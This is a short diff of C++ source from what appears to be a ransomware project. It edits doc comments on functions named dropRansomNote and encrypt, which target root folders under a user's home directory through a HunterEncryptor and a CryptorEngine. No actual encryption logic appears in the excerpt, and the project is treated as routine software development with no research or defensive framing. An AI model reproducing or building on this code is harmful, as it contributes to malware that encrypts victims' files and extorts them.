@@ -79,7 +79,7 @@ int main(){
 	return 0;
 }
 
-/** Impl of dropRansomNote(vector, CryptorEngine, vector, vector, path). */
+/** Impl of dropRansomNote(vector<path>, CryptorEngine, vector<path>, vector<path>, path). */
 void cryptor::Main::dropRansomNote(
 	const std::vector<fs::path>& targets, common::io::CryptorEngine& cEngine,
 	const std::vector<fs::path>& roots, const std::vector<fs::path>& encrypted,
@@ -110,7 +110,7 @@ void cryptor::Main::dropRansomNote(
 	}
 }
 
-/** Impl of encrypt(path, vector, CryptorEngine). */ //TODO: move the cryptor engine creation to main()
+/** Impl of encrypt(path, vector<path>, CryptorEngine). */ //TODO: move the cryptor engine creation to main()
 std::vector<fs::path> cryptor::Main::encrypt(const fs::path& homeFolder, const std::vector<fs::path>& roots, common::io::CryptorEngine& cryptorEngine){
 	//Get the list of targets to encrypt
 	cryptor::HunterEncryptor hunter(roots);
